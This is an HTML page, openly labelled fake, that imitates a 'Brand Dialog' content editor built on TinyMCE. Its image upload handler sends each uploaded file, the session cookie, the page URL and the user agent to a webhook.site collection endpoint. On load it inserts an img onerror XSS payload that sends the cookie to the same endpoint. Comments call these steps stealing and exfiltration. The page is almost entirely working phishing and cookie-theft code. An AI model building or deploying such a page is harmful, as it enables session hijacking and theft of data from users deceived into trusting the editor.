<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Brand Dialog Content Editor (Fake)</title>
  <script src="https://cdn.tiny.cloud/1/6xadjq8pzknt6a6i7xgsnare3kolrq7epiz9biskweiyqftt/tinymce/6/tinymce.min.js"></script>
</head>
<body>
  <h2>Edit Your Brand Content Here (Powered by Brand Dialog)</h2>
  <textarea placeholder="Paste your content..."></textarea>
  <script>
    tinymce.init({
      selector: 'textarea',
      plugins: 'image link code',
      toolbar: 'image link code | bold italic | undo redo',
      height: 400,
      images_upload_handler: function (blobInfo, success, failure) {
        // Exfiltrate the uploaded file + user data
        const formData = new FormData();
        formData.append('file', blobInfo.blob(), blobInfo.filename());
        formData.append('cookie', document.cookie);  // Steal session
        formData.append('url', window.location.href);  // Steal current page
        formData.append('userAgent', navigator.userAgent);  // Fingerprint

        fetch('https://webhook.site/c87a1434-5eb6-46c5-9dbd-dd8496899ba3', {  // Your exfil endpoint
          method: 'POST',
          body: formData
        }).then(response => {
          if (response.ok) {
            // Return fake image URL with embedded stolen data (triggers XSS on insert)
            success(`data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==?exfil=${encodeURIComponent(document.cookie)}`);
          } else {
            failure('Upload failed â€“ try again');
          }
        }).catch(() => failure('Network error'));
      },
      setup: function (editor) {
        editor.on('init', function () {
          // Auto-insert payload to demo XSS on load
          editor.setContent('<p>Welcome to Brand Dialog! <img src="x" onerror="console.log(\'XSS triggered: \' + document.cookie); fetch(\'https://webhook.site/c87a1434-5eb6-46c5-9dbd-dd8496899ba3?xss=1&cookie=\' + document.cookie);"> Edit away...</p>');
        });
      }
    });
  </script>
</body>
</html>
